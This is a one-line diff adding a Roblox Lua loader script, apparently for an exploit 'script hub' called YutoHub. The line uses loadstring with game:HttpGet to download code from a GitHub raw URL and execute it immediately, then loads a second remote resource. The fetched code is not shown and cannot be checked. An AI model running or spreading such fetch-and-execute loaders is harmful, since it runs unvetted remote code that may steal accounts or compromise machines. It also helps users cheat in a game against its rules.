@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sandwichk/RobloxScripts/main/Scripts/YutoHub/Load.lua"))():load("https://raw.githubusercontent.com/Binintrozza/yutv2e/main/afss")
